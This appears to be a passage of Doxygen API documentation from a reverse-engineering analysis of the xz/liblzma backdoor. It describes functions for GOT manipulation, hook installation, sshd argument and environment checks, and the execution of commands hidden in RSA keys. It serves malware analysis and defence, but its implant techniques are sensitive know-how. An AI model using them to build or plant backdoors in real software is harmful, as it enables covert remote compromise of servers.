<h2 class="memtitle"><span class="permalink"><a href="#a3ab8cd040932beaf3ec377a753bfece0">&#9670;&nbsp;</a></span>find_mov_instruction()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_mov_instruction </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>is_64bit_operand</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>load_flag</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>dctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds a MOV instruction. </p>
<p><code>load_flag</code> specifies if the desired MOV should be a load: </p><div class="fragment"><div class="line">mov reg, [mem] </div>
</div><!-- fragment --><p> or a store </p><div class="fragment"><div class="line">mov [mem], reg </div>
</div><!-- fragment --><dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">is_64bit_operand</td><td>TRUE if MOV should have a 64bit operand, FALSE otherwise </td></tr>
    <tr><td class="paramname">load_flag</td><td>TRUE if searching for load, FALSE for a store </td></tr>
    <tr><td class="paramname">dctx</td><td>disassembler context to hold the state </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="ae9718452d28f67f46d046c02c0125148"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ae9718452d28f67f46d046c02c0125148">&#9670;&nbsp;</a></span>find_mov_lea_instruction()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_mov_lea_instruction </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>is_64bit_operand</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL&#160;</td>
          <td class="paramname"><em>load_flag</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>dctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>like <a class="el" href="xzre_8h.html#a3ab8cd040932beaf3ec377a753bfece0">find_mov_instruction</a>, but also considers LEA instructions </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">is_64bit_operand</td><td>TRUE if MOV should have a 64bit operand, FALSE otherwise </td></tr>
    <tr><td class="paramname">load_flag</td><td>TRUE if searching for load, FALSE for a store </td></tr>
    <tr><td class="paramname">dctx</td><td>disassembler context to hold the state </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="aed0391d07e4413f5a13e1ec2940c94ea"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aed0391d07e4413f5a13e1ec2940c94ea">&#9670;&nbsp;</a></span>find_reg2reg_instruction()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL find_reg2reg_instruction </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structdasm__ctx.html">dasm_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>dctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds a reg2reg instruction </p>
<p>a reg2reg instruction is an x64 instruction with one of the following characteristics:</p><ul>
<li>a primary opcode of 0x89 (MOV/JNS) or, alternatively, passing the following filter:</li>
<li>((0x505050500000505uLL &gt;&gt; (((dctx-&gt;opcode) &amp; 0xFF) + 0x7F)) &amp; 1) != 0 NOTE: the opcode in 'dctx-&gt;opcode' is the actual opcode +0x80 TODO: inspect x64 manual to find the exact filter</li>
</ul>
<p>the instruction must also satisfy the following conditions:</p><ul>
<li>NOT have REX.B and REX.R set (no extension bits)</li>
<li>MODRM.mod must be 3 (register-direct addressing mode)</li>
</ul>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">dctx</td><td>disassembler context to hold the state </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if found, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a78aba1d370c6519777e637f1ed7b7c14"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a78aba1d370c6519777e637f1ed7b7c14">&#9670;&nbsp;</a></span>find_string_reference()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">u8* find_string_reference </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">const char *&#160;</td>
          <td class="paramname"><em>str</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>finds an instruction that references the given string </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>address to start searching from </td></tr>
    <tr><td class="paramname">code_end</td><td>address to stop searching at </td></tr>
    <tr><td class="paramname">str</td><td>the target of the string reference (i.e. the target of the LEA instruction) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>u8* the address of the first instruction that references the given string, or NULL if not found </dd></dl>

</div>
</div>
<a id="aee7738c9cab5f6733c666e0a20e5ba99"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aee7738c9cab5f6733c666e0a20e5ba99">&#9670;&nbsp;</a></span>get_cpuid_got_index()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">u64 get_cpuid_got_index </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>get the cpuid() GOT index </p>
<p>stores the index in <a class="el" href="structelf__entry__ctx.html#ac57b21a9eadcd40b34305f45684cc2e9" title="points to the real cpuid function">elf_entry_ctx_t::cpuid_fn</a></p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ctx</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>u64 cpuid() GOT index </dd></dl>

</div>
</div>
<a id="aa3c963b13e204d9d99ab57a5647e9b45"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aa3c963b13e204d9d99ab57a5647e9b45">&#9670;&nbsp;</a></span>get_elf_functions_address()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname"><a class="el" href="structelf__functions.html">elf_functions_t</a>* get_elf_functions_address </td>
          <td>(</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>gets the address of the <a class="el" href="structelf__functions.html">elf_functions</a> </p>
<p>uses elf_functions_offset to get the address 0x2a0 bytes before <a class="el" href="structelf__functions.html">elf_functions</a> and then adds 0x268 to get the final address of <a class="el" href="structelf__functions.html">elf_functions</a></p><ul>
<li><dl class="section return"><dt>Returns</dt><dd>elf_functions_t* </dd></dl>
</li>
</ul>

</div>
</div>
<a id="ad33792d2db40b95a7b434081d1608ca4"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ad33792d2db40b95a7b434081d1608ca4">&#9670;&nbsp;</a></span>get_got_offset()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">ptrdiff_t get_got_offset </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>get the offset to the GOT </p>
<p>the offset is relative to the address of the symbol cpuid_random_symbol</p>
<p>stores the offset in <a class="el" href="structelf__entry__ctx.html#ab5aad4ce617c033e5e2d4740dc8551b7" title="holds the offset of the symbol relative to the GOT. used to derive the got_ptr">elf_entry_ctx_t::got_offset</a></p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ctx</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>ptrdiff_t offset to GOT from the symbol cpuid_random_symbol </dd></dl>

</div>
</div>
<a id="abc618a02e31b94194ce03b0c4a2b3597"></a>
<h2 class="memtitle"><span class="permalink"><a href="#abc618a02e31b94194ce03b0c4a2b3597">&#9670;&nbsp;</a></span>get_lzma_allocator()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">lzma_allocator* get_lzma_allocator </td>
          <td>(</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>gets the fake LZMA allocator, used for imports resolution the "opaque" field of the structure holds a pointer to </p>
<dl class="section see"><dt>See also</dt><dd>elf_info_t</dd></dl>
<dl class="section return"><dt>Returns</dt><dd>lzma_allocator* </dd></dl>

</div>
</div>
<a id="a45b23f67e591074c22a0691a6b5aced5"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a45b23f67e591074c22a0691a6b5aced5">&#9670;&nbsp;</a></span>get_lzma_allocator_address()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname"><a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator_t</a>* get_lzma_allocator_address </td>
          <td>(</td>
          <td class="paramname"></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>gets the address of the fake LZMA allocator </p>
<p>uses fake_lzma_allocator_offset to get the address 0x180 bytes before <a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator</a> and then adds 0x160 to get the final address of <a class="el" href="structfake__lzma__allocator.html">fake_lzma_allocator</a></p>
<p>called in <a class="el" href="xzre_8h.html#abc618a02e31b94194ce03b0c4a2b3597" title="gets the fake LZMA allocator, used for imports resolution the &quot;opaque&quot; field of the structure holds a...">get_lzma_allocator()</a></p>
<dl class="section return"><dt>Returns</dt><dd>fake_lzma_allocator_t* </dd></dl>

</div>
</div>
<a id="a6189320317764e3344934873b58b30b1"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a6189320317764e3344934873b58b30b1">&#9670;&nbsp;</a></span>get_string_id()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">EncodedStringId get_string_id </td>
          <td>(</td>
          <td class="paramtype">const char *&#160;</td>
          <td class="paramname"><em>string_begin</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">const char *&#160;</td>
          <td class="paramname"><em>string_end</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Get the. </p>
<dl class="section see"><dt>See also</dt><dd>EncodedStringId for the given string the string will be consumed until one of the following condition is reached (whichever happens first):<ul>
<li>44 chars have been consumed (maximum string length)</li>
<li><code>string_end</code> is supplied and has been reached</li>
<li>the string table has been exhausted</li>
</ul>
</dd></dl>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">string_begin</td><td>the string to get the ID for (max 44 chars) </td></tr>
    <tr><td class="paramname">string_end</td><td>optional string end pointer </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>EncodedStringId the string ID matching the input string, or 0 if not found </dd></dl>

</div>
</div>
<a id="ae20580c7a069afb3b578f060582867df"></a>
<h2 class="memtitle"><span class="permalink"><a href="#ae20580c7a069afb3b578f060582867df">&#9670;&nbsp;</a></span>get_tls_get_addr_random_symbol_got_offset()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">ptrdiff_t get_tls_get_addr_random_symbol_got_offset </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>get the tls_get_addr_random_symbol GOT offset </p>
<p>sets <a class="el" href="structelf__entry__ctx.html#a88320cc048dda10c9063bac93f76b6a0" title="points to the Global Offset Table">elf_entry_ctx_t::got_ptr</a> = 0x2600 stores the index in <a class="el" href="structelf__entry__ctx.html#ab5aad4ce617c033e5e2d4740dc8551b7" title="holds the offset of the symbol relative to the GOT. used to derive the got_ptr">elf_entry_ctx_t::got_offset</a></p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ctx</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>ptrdiff_t tls_get_addr_random_symbol GOT offset </dd></dl>

</div>
</div>
<a id="abf19222b4917f772ad487a2970dd51ec"></a>
<h2 class="memtitle"><span class="permalink"><a href="#abf19222b4917f772ad487a2970dd51ec">&#9670;&nbsp;</a></span>init_elf_entry_ctx()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">ptrdiff_t init_elf_entry_ctx </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>initialises the elf_entry_ctx_t </p>
<p>stores the address of the symbol cpuid_random_symbol in <a class="el" href="structelf__entry__ctx.html#a286882a4d56155f97674460abe66b9cb" title="points to a symbol in memory will be used to find the GOT value">elf_entry_ctx_t::symbol_ptr</a> stores the return address of the function that called the IFUNC resolver which is a stack address in ld.so calls <a class="el" href="xzre_8h.html#ad33792d2db40b95a7b434081d1608ca4" title="get the offset to the GOT">get_got_offset()</a> to update <a class="el" href="structelf__entry__ctx.html#ab5aad4ce617c033e5e2d4740dc8551b7" title="holds the offset of the symbol relative to the GOT. used to derive the got_ptr">elf_entry_ctx_t::got_offset</a> calls <a class="el" href="xzre_8h.html#aee7738c9cab5f6733c666e0a20e5ba99" title="get the cpuid() GOT index">get_cpuid_got_index()</a> to update <a class="el" href="structelf__entry__ctx.html#ac57b21a9eadcd40b34305f45684cc2e9" title="points to the real cpuid function">elf_entry_ctx_t::cpuid_fn</a></p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">ctx</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>ptrdiff_t always 0 </dd></dl>

</div>
</div>
<a id="abbcfd61778019372e0cabdf79b98824d"></a>
<h2 class="memtitle"><span class="permalink"><a href="#abbcfd61778019372e0cabdf79b98824d">&#9670;&nbsp;</a></span>init_hook_functions()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">int init_hook_functions </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structbackdoor__hooks__ctx.html">backdoor_hooks_ctx_t</a> *&#160;</td>
          <td class="paramname"><em>funcs</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Initializes the structure with hooks-related data. </p>
<p>Grabs the call addresses of the internal functions that will be installed into the hook locations.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">funcs</td><td></td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>int </dd></dl>

</div>
</div>
<a id="a544d2cf67930e0fcd9f9ff37239a4c70"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a544d2cf67930e0fcd9f9ff37239a4c70">&#9670;&nbsp;</a></span>is_endbr64_instruction()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL is_endbr64_instruction </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_start</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>code_end</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u32&#160;</td>
          <td class="paramname"><em>low_mask_part</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Checks if the code between <code>code_start</code> and <code>code_end</code> is an endbr64 instruction. </p>
<p>the checks is encoded as following (note: An endbr64 instruction is encoded as <code>F3 0F 1E FA</code>) </p><div class="fragment"><div class="line"><span class="comment">// as 32bit quantities, so 0x10000f223 -&gt; f223</span></div>
<div class="line">(0xFA1E0FF3 + (0xE230 | 0x5E20000)) == 0xF223</div>
</div><!-- fragment --><p> and 0xE230 is always passed as an argument to prevent compiler optimizations and for further obfuscation.</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">code_start</td><td>pointer to the first byte of the instruction to test </td></tr>
    <tr><td class="paramname">code_end</td><td>pointer to the last byte of the instruction to test </td></tr>
    <tr><td class="paramname">low_mask_part</td><td>the constant 0xE230 </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the instruction is an endbr64, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a2cbf38048a3510f1632b4060b2a0a63f"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a2cbf38048a3510f1632b4060b2a0a63f">&#9670;&nbsp;</a></span>is_range_mapped()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL is_range_mapped </td>
          <td>(</td>
          <td class="paramtype">u8 *&#160;</td>
          <td class="paramname"><em>addr</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">u8&#160;</td>
          <td class="paramname"><em>length</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>verify if a memory range is mapped </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">addr</td><td>the start address </td></tr>
    <tr><td class="paramname">length</td><td>the length of the range to check </td></tr>
    <tr><td class="paramname">ctx</td><td>a structure with a libc_import_t field at offset 0x10 </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if the whole range is mapped, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a642ed90d3ade30228b3286310de5e5c1"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a642ed90d3ade30228b3286310de5e5c1">&#9670;&nbsp;</a></span>main_elf_parse()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL main_elf_parse </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structmain__elf.html">main_elf_t</a> *&#160;</td>
          <td class="paramname"><em>main_elf</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>Parses the main executable from the provided structure. As part of the process the arguments and environment is checked. </p>
<p>The main_elf_t::dynamic_linker_ehdr is set in <a class="el" href="xzre_8h.html#a229ee0bd4111363061bc4230bc1f6423" title="the backdoor main method">backdoor_setup()</a> by an interesting trick where the address of __tls_get_addr() is found via GOT in <a class="el" href="xzre_8h.html#ad3a61f27a1663eb3e0b25b861c85fe3c" title="finds the __tls_get_addr() GOT entry">update_got_address()</a>. Then a backwards search for the ELF header magic bytes from this address is performed to find the ld.so ELF header.</p>
<p>The following checks are performed:</p><ul>
<li>that argv[0] is "/usr/sbin/sshd"</li>
<li>the remaining args all start with '-'</li>
<li>the args do not contain the '-d' or '-D' flags (which set sshd into debug or non-daemon mode)</li>
<li>that there is not any '\t' or '=' characters in the args</li>
<li>the environment variable strings do not start with any string from the encoded string table</li>
</ul>
<p>In particular these environment strings:</p><ul>
<li>"DISPLAY="</li>
<li>"LD_AUDIT="</li>
<li>"LD_BIND_NOT="</li>
<li>"LD_DEBUG="</li>
<li>"LD_PROFILE="</li>
<li>"LD_USE_LOAD_BIAS="</li>
<li>"LINES="</li>
<li>"TERM="</li>
<li>"WAYLAND_DISPLAY="</li>
<li>"yolAbejyiejuvnup=Evjtgvsh5okmkAvj"</li>
</ul>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname"><a class="el" href="structmain__elf.html">main_elf</a></td><td>The main executable to parse. </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful and all checks passed, or FALSE otherwise. </dd></dl>

</div>
</div>
<a id="a1cb8bb283baa56567d7b88b5fcfe7db7"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a1cb8bb283baa56567d7b88b5fcfe7db7">&#9670;&nbsp;</a></span>process_shared_libraries()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL process_shared_libraries </td>
          <td>(</td>
          <td class="paramtype"><a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a> *&#160;</td>
          <td class="paramname"><em>data</em></td><td>)</td>
          <td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>scans loaded libraries to identify interesting libraries </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">data</td><td>input data for the function (will be duplicated, internally) </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a1fcba1b3d069ccf76ee3cef4a3b9a682"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a1fcba1b3d069ccf76ee3cef4a3b9a682">&#9670;&nbsp;</a></span>process_shared_libraries_map()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL process_shared_libraries_map </td>
          <td>(</td>
          <td class="paramtype">struct link_map *&#160;</td>
          <td class="paramname"><em>r_map</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structbackdoor__shared__libraries__data.html">backdoor_shared_libraries_data_t</a> *&#160;</td>
          <td class="paramname"><em>data</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>scans loaded libraries to identify interesting libraries and populate related data </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">r_map</td><td>the linked list of loaded libraries obtained from <code>r_debug</code> </td></tr>
    <tr><td class="paramname">data</td><td>pointer to data that will be populated by the function </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="a0d70747b6216270de07c783fc499938e"></a>
<h2 class="memtitle"><span class="permalink"><a href="#a0d70747b6216270de07c783fc499938e">&#9670;&nbsp;</a></span>resolve_libc_imports()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL resolve_libc_imports </td>
          <td>(</td>
          <td class="paramtype">struct link_map *&#160;</td>
          <td class="paramname"><em>libc</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structelf__info.html">elf_info_t</a> *&#160;</td>
          <td class="paramname"><em>libc_info</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structlibc__imports.html">libc_imports_t</a> *&#160;</td>
          <td class="paramname"><em>imports</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>parses the libc ELF from the supplied link map, and resolves its imports </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">libc</td><td>the loaded libc's link map (obtained by traversing r_debug-&gt;r_map) </td></tr>
    <tr><td class="paramname">libc_info</td><td>pointer to an ELF context that will be populated with the parsed ELF information </td></tr>
    <tr><td class="paramname">imports</td><td>pointer to libc imports that will be populated with resolved libc function pointers </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if successful, FALSE otherwise </dd></dl>

</div>
</div>
<a id="add930f2364d6ac0711ec484781f00f03"></a>
<h2 class="memtitle"><span class="permalink"><a href="#add930f2364d6ac0711ec484781f00f03">&#9670;&nbsp;</a></span>run_backdoor_commands()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL run_backdoor_commands </td>
          <td>(</td>
          <td class="paramtype">RSA *&#160;</td>
          <td class="paramname"><em>key</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="structglobal__context.html">global_context_t</a> *&#160;</td>
          <td class="paramname"><em>ctx</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">BOOL *&#160;</td>
          <td class="paramname"><em>do_orig</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>checks if the supplied RSA public key contains the backdoor commands, and executes them if present. </p>
<p>this function is called from function hooks. the output parameter <code>do_orig</code> will indicate to the caller if the original function should be invoked or not</p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">key</td><td>the public RSA key to check </td></tr>
    <tr><td class="paramname">ctx</td><td>the global context, used for the secret data (chacha key) </td></tr>
    <tr><td class="paramname">do_orig</td><td>output variable. will contain TRUE if the original function should be invoked, FALSE otherwise. </td></tr>
  </table>
  </dd>
</dl>
<dl class="section return"><dt>Returns</dt><dd>BOOL TRUE if backdoor commands were invoked, FALSE otherwise </dd></dl>

</div>
</div>
<a id="aa7239c834d2598747c9158949280783b"></a>
<h2 class="memtitle"><span class="permalink"><a href="#aa7239c834d2598747c9158949280783b">&#9670;&nbsp;</a></span>secret_data_append_from_address()</h2>

<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">BOOL secret_data_append_from_address </td>
          <td>(</td>
          <td class="paramtype">void *&#160;</td>
          <td class="paramname"><em>addr</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype"><a class="el" href="unionsecret__data__shift__cursor__t.html">secret_data_shift_cursor_t</a>&#160;</td>
          <td class="paramname"><em>shift_cursor</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>shift_count</em>, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">unsigned&#160;</td>
          <td class="paramname"><em>operation_index</em>&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
</div><div class="memdoc">

<p>calls <a class="el" href="xzre_8h.html#a48636f910a9c7df2f2adfa4abf7a73e9">secret_data_append_singleton</a> with either the given code address or the return address, if <code>addr</code> is &lt;= 1 </p>
<dl class="params"><dt>Parameters</dt><dd>
  <table class="params">
    <tr><td class="paramname">addr</td><td>the code address to use for the verification. NULL to use the return address </td></tr>
    <tr><td class="paramname">shift_cursor</td><td>the initial shift index </td></tr>
